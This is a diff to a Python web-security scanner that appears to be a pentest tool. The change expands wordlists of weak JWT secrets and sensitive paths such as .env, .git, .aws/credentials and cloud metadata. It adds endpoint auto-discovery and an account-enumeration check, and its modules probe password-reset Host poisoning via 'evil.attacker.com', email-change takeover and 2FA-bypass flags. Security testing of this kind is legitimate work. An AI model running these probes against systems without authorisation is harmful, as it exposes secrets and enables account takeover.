@@ -44,22 +44,59 @@ WEAK_JWT_SECRETS = [
     "admin", "qwerty", "letmein", "changeme", "pass", "token",
     "mysecret", "jwtkey", "your-256-bit-secret", "your-secret-key",
     "supersecret", "HS256", "hmac", "signing-key", "app-secret",
+    "12345678", "123456789", "iloveyou", "princess", "rockyou",
+    "secret123", "admin123", "administrator", "root", "toor",
+    "secret_key", "secretkey", "private_key", "privatekey", "api_key",
+    "apikey", "auth_secret", "auth_key", "jwt_secret", "jwt_key",
 ]
 
 # ─── Sensitive Files to Probe ──────────────────────────────────────────────────
 SENSITIVE_PATHS = [
-    "/.env", "/.env.production", "/.env.local", "/.env.backup",
+    # Environment & Config
+    "/.env", "/.env.production", "/.env.local", "/.env.backup", "/.env.dev",
+    "/.env.staging", "/.env.test", "/config.env", "/server.env",
+    # Git exposure
     "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
-    "/config.json", "/config.yml", "/config.yaml", "/settings.json",
-    "/api/swagger.json", "/api/openapi.json", "/swagger.json",
-    "/api-docs", "/api/docs", "/openapi.yaml",
+    "/.git/logs/HEAD", "/.git/refs/heads/main", "/.git/refs/heads/master",
+    # Config files
+    "/config.json", "/config.yml", "/config.yaml", "/settings.json", "/settings.py",
+    "/app.config.json", "/application.yml", "/application.properties",
+    "/secrets.json", "/secrets.yml", "/credentials.json",
+    "/web.config", "/appsettings.json", "/appsettings.Development.json",
+    # API Documentation (goldmine for endpoint discovery)
+    "/api/swagger.json", "/api/openapi.json", "/swagger.json", "/swagger.yaml",
+    "/api-docs", "/api/docs", "/openapi.yaml", "/openapi.json",
+    "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
+    "/api/v1/swagger.json", "/api/v2/swagger.json",
+    "/_swagger", "/documentation",
+    # Databases
     "/backup.sql", "/backup.zip", "/db.sql", "/database.sql",
-    "/phpinfo.php", "/info.php", "/test.php",
-    "/robots.txt", "/sitemap.xml",
-    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",  # Spring Boot
-    "/api/v1/users", "/api/v2/users", "/api/users",  # Unauthenticated user list
+    "/dump.sql", "/data.sql", "/users.sql", "/wordpress.sql",
+    # PHP info & debug
+    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
+    "/server-status", "/server-info",
+    # Robots/Sitemap
+    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
+    # Spring Boot Actuator
+    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
+    "/actuator/beans", "/actuator/loggers", "/actuator/heapdump",
+    # Django debug
+    "/__debug__/", "/django-admin/",
+    # AWS / Cloud metadata
+    "/latest/meta-data/", "/.aws/credentials",
+    # Unauthenticated user lists
+    "/api/v1/users", "/api/v2/users", "/api/users", "/api/v1/admin/users",
+    # GraphQL
+    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
+    # Common secrets
+    "/private/", "/secret/", "/admin/", "/console/", "/manage/",
     "/.well-known/security.txt",
-    "/graphql", "/graphiql", "/api/graphql",  # GraphQL introspection
+    # Node.js
+    "/package.json", "/package-lock.json", "/.npmrc",
+    # Source maps
+    "/static/js/main.chunk.js.map", "/app.js.map",
+    # Docker
+    "/docker-compose.yml", "/Dockerfile",
 ]
 
 
@@ -127,6 +164,76 @@ class AuthLogicEngine:
             )
         except Exception:
             return None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # MODULE 0: Auto-Discovery
+    # ─────────────────────────────────────────────────────────────────────────
+
+    def _auto_discover_auth_endpoints(self) -> dict:
+        """
+        Crawls common pages to discover real authentication endpoints.
+        Finds <form action=...> elements and known API response patterns.
+        Returns dicts of discovered endpoints per category.
+        """
+        discovered = {
+            "reset_endpoints": [],
+            "email_change_endpoints": [],
+            "mfa_endpoints": [],
+        }
+
+        crawl_urls = [
+            self.target + p for p in [
+                "/", "/login", "/signin", "/auth/login",
+                "/forgot-password", "/reset-password",
+                "/account", "/account/settings", "/my-account",
+                "/account/security", "/account/profile",
+            ]
+        ]
+
+        reset_hints = ["forgot", "reset", "password", "recover"]
+        email_hints = ["email", "profile", "account", "update"]
+        mfa_hints  = ["2fa", "mfa", "otp", "verify", "totp"]
+
+        seen = set()
+        for url in crawl_urls:
+            try:
+                r = httpx.get(url, cookies=self.cookies, timeout=8, verify=False,
+                              headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=True)
+                if r.status_code != 200:
+                    continue
+
+                # Find form actions
+                actions = re.findall(
+                    r'<form[^>]+action=["\']?(/[^"\'>\s]+)["\']?', r.text, re.IGNORECASE
+                )
+                for action in actions:
+                    full = self.target + action
+                    if full in seen:
+                        continue
+                    seen.add(full)
+                    al = action.lower()
+                    if any(h in al for h in reset_hints):
+                        discovered["reset_endpoints"].append(action)
+                        console.print(f"     🔍 Auto-discovered reset endpoint: [cyan]{action}[/cyan]")
+                    elif any(h in al for h in email_hints):
+                        discovered["email_change_endpoints"].append(action)
+                    elif any(h in al for h in mfa_hints):
+                        discovered["mfa_endpoints"].append(action)
+
+                # Also detect API endpoints from XHR patterns in JS
+                api_paths = re.findall(
+                    r'(?:fetch|axios\.(?:post|put|patch)|\$.ajax)\(["\']?(/api/[^"\'>\s,)]+)',
+                    r.text, re.IGNORECASE
+                )
+                for apath in api_paths:
+                    if any(h in apath.lower() for h in reset_hints) and apath not in seen:
+                        discovered["reset_endpoints"].append(apath)
+                        seen.add(apath)
+
+            except Exception:
+                continue
+
+        return discovered
 
     # ─────────────────────────────────────────────────────────────────────────
     # MODULE 1: JWT Analyzer
@@ -259,15 +366,14 @@ class AuthLogicEngine:
     # MODULE 2: Password Reset Poisoning
     # ─────────────────────────────────────────────────────────────────────────
 
-    def scan_password_reset_poisoning(self) -> list[dict]:
+    def scan_password_reset_poisoning(self, reset_endpoints: Optional[list] = None) -> list[dict]:
         """
         Tests if the password reset endpoint uses the Host header to build the reset link.
-        An attacker who controls the Host header gets the victim's reset token.
         """
         findings = []
         console.print("\n  [bold]🔏 Password Reset Poisoning[/bold]")
 
-        reset_endpoints = [
+        endpoints_to_test = reset_endpoints or [
             "/forgot-password", "/password/reset", "/auth/forgot-password",
             "/api/password/reset", "/api/v1/password/forgot",
             "/account/password-reset", "/users/password/forgot",
@@ -277,7 +383,7 @@ class AuthLogicEngine:
         poisoned_host = "evil.attacker.com"
         test_email = "test@example.com"
 
-        for endpoint in reset_endpoints:
+        for endpoint in endpoints_to_test:
             resp_normal = self._post(endpoint, json_data={"email": test_email})
             if not resp_normal or resp_normal.status_code not in (200, 201, 202, 400, 422):
                 continue
@@ -333,17 +439,14 @@ class AuthLogicEngine:
     # MODULE 3: Email Change Account Takeover
     # ─────────────────────────────────────────────────────────────────────────
 
-    def scan_email_change_ato(self) -> list[dict]:
+    def scan_email_change_ato(self, change_endpoints: Optional[list] = None) -> list[dict]:
         """
-        Tests if changing the email in account settings:
-        - Does NOT require current password
-        - Does NOT send a verification link to the old email
-        Both conditions can lead to Account Takeover.
+        Tests if changing the email in account settings requires no current password.
         """
         findings = []
         console.print("\n  [bold]📧 Email Change ATO Detection[/bold]")
 
-        change_endpoints = [
+        endpoints_to_test = change_endpoints or [
             "/api/v1/me", "/api/v2/me", "/api/user/profile",
             "/api/v1/profile", "/api/me", "/account/profile",
             "/api/v2/icinl3/users/me",
@@ -352,7 +455,7 @@ class AuthLogicEngine:
 
         test_new_email = "attacker+victim@evil.com"
 
-        for endpoint in change_endpoints:
+        for endpoint in endpoints_to_test:
             # First check if endpoint exists and returns current user data
             resp = self._get(endpoint)
             if not resp or resp.status_code != 200:
@@ -495,12 +598,12 @@ class AuthLogicEngine:
     # MODULE 5: 2FA Bypass Patterns
     # ─────────────────────────────────────────────────────────────────────────
 
-    def scan_2fa_bypass(self) -> list[dict]:
+    def scan_2fa_bypass(self, mfa_endpoints: Optional[list] = None) -> list[dict]:
         """Tests common 2FA bypass patterns."""
         findings = []
         console.print("\n  [bold]🔐 2FA Bypass Detection[/bold]")
 
-        mfa_endpoints = [
+        endpoints_to_test = mfa_endpoints or [
             "/api/v1/auth/mfa/verify",
             "/api/v2/auth/totp/verify",
             "/api/auth/2fa",
@@ -517,7 +620,7 @@ class AuthLogicEngine:
             {"mfa_skip": True},     # Skip flag
         ]
 
-        for endpoint in mfa_endpoints:
+        for endpoint in endpoints_to_test:
             resp = self._post(endpoint, json_data={"code": "test_probe"})
             if not resp or resp.status_code == 404:
                 continue
@@ -547,6 +650,87 @@ class AuthLogicEngine:
         return findings
 
     # ─────────────────────────────────────────────────────────────────────────
+    # MODULE 6: Account Enumeration
+    # ─────────────────────────────────────────────────────────────────────────
+
+    def scan_account_enumeration(self, reset_endpoints: Optional[list] = None) -> list[dict]:
+        """
+        Tests if the application reveals whether an email is registered or not
+        by comparing responses between a known-registered and unregistered email.
+        """
+        findings = []
+        console.print("\n  [bold]👥 Account Enumeration Detection[/bold]")
+
+        endpoints_to_test = reset_endpoints or [
+            "/forgot-password", "/password/reset", "/auth/forgot-password",
+            "/api/password/reset", "/api/v1/password/forgot",
+            "/login", "/api/login", "/auth/login", "/signin"
+        ]
+
+        # Use the attacker's simulated email as the "registered" one
+        registered_email = os.getenv("VICTIM_EMAIL", "victim@example.com")
+        unregistered_email = f"not_exist_{int(time.time())}@example.com"
+
+        for endpoint in endpoints_to_test:
+            # 1. Probe Unregistered
+            start_time = time.time()
+            resp_unreg = self._post(endpoint, json_data={"email": unregistered_email})
+            unreg_time = time.time() - start_time
+            if not resp_unreg:
+                continue
+
+            # 2. Probe Registered
+            start_time = time.time()
+            resp_reg = self._post(endpoint, json_data={"email": registered_email})
+            reg_time = time.time() - start_time
+            if not resp_reg:
+                continue
+
+            console.print(f"     🔍 Testing endpoint: {endpoint}")
+
+            # Analyze differences
+            timing_diff = abs(reg_time - unreg_time)
+            status_diff = resp_reg.status_code != resp_unreg.status_code
+            length_diff = abs(len(resp_reg.text) - len(resp_unreg.text)) > 5
+            text_diff_significant = False
+
+            if length_diff and resp_reg.status_code == resp_unreg.status_code:
+                # Basic text analysis to avoid false positives on dynamic CSRF tokens etc.
+                if "not found" in resp_unreg.text.lower() and "not found" not in resp_reg.text.lower():
+                    text_diff_significant = True
+                if "invalid" in resp_unreg.text.lower() and "sent" in resp_reg.text.lower():
+                    text_diff_significant = True
+
+            if status_diff or text_diff_significant or timing_diff > 1.5:
+                method = "Status Code Difference" if status_diff else ("Text Difference" if text_diff_significant else "Timing Difference")
+                cvss = 5.3 if (status_diff or text_diff_significant) else 3.7
+                severity = "MEDIUM" if cvss > 4.0 else "LOW"
+
+                finding = {
+                    "type": f"Account Enumeration ({method})",
+                    "severity": severity,
+                    "cvss_score": cvss,
+                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                    "endpoint": endpoint,
+                    "registered_email_used": registered_email,
+                    "description": (
+                        f"Endpoint {endpoint} behaves differently for registered vs unregistered emails. "
+                        f"Registered timing: {reg_time:.2f}s, Unregistered timing: {unreg_time:.2f}s. "
+                        f"Status: {resp_reg.status_code} vs {resp_unreg.status_code}. "
+                        "This allows attackers to harvest valid accounts."
+                    ),
+                    "owasp": "A07:2021 — Identification and Authentication Failures",
+                    "timestamp": datetime.utcnow().isoformat(),
+                }
+                findings.append(finding)
+                console.print(f"     [bold yellow]⚠️  ENUMERATION: Found via {method}.[/bold yellow]")
+
+        if not findings:
+            console.print("     [dim]No account enumeration vulnerabilities found[/dim]")
+
+        return findings
+
+    # ─────────────────────────────────────────────────────────────────────────
     # MAIN RUNNER
     # ─────────────────────────────────────────────────────────────────────────
 
@@ -559,12 +743,37 @@ class AuthLogicEngine:
             style="bright_red",
         ))
 
-        # Run all modules
+        # Auto-discover real endpoints from the site's HTML
+        console.print("\n  [bold]🔍 Auto-Discovery: scanning for real auth endpoints...[/bold]")
+        discovered = self._auto_discover_auth_endpoints()
+
+        # Merge discovered with hardcoded defaults
+        global_reset_endpoints = [
+            "/forgot-password", "/password/reset", "/auth/forgot-password",
+            "/api/password/reset", "/api/v1/password/forgot",
+            "/account/password-reset", "/users/password/forgot",
+            "/my-account/forgot-password",
+        ] + discovered["reset_endpoints"]
+
+        global_email_endpoints = [
+            "/api/v1/me", "/api/v2/me", "/api/user/profile",
+            "/api/v1/profile", "/api/me", "/account/profile",
+            "/api/v2/icinl3/users/me",
+            "/my-account/update-email", "/api/customer/email",
+        ] + discovered["email_change_endpoints"]
+
+        global_mfa_endpoints = [
+            "/api/v1/auth/mfa/verify", "/api/v2/auth/totp/verify",
+            "/api/auth/2fa", "/api/v1/verify-otp", "/auth/mfa", "/login/verify",
+        ] + discovered["mfa_endpoints"]
+
+        # Run all modules using merged endpoint lists
         self.findings.extend(self.scan_sensitive_files())
         self.findings.extend(self.scan_jwt())
-        self.findings.extend(self.scan_password_reset_poisoning())
-        self.findings.extend(self.scan_email_change_ato())
-        self.findings.extend(self.scan_2fa_bypass())
+        self.findings.extend(self.scan_password_reset_poisoning(reset_endpoints=global_reset_endpoints))
+        self.findings.extend(self.scan_email_change_ato(change_endpoints=global_email_endpoints))
+        self.findings.extend(self.scan_2fa_bypass(mfa_endpoints=global_mfa_endpoints))
+        self.findings.extend(self.scan_account_enumeration(reset_endpoints=global_reset_endpoints))
 
         # Print summary
         critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
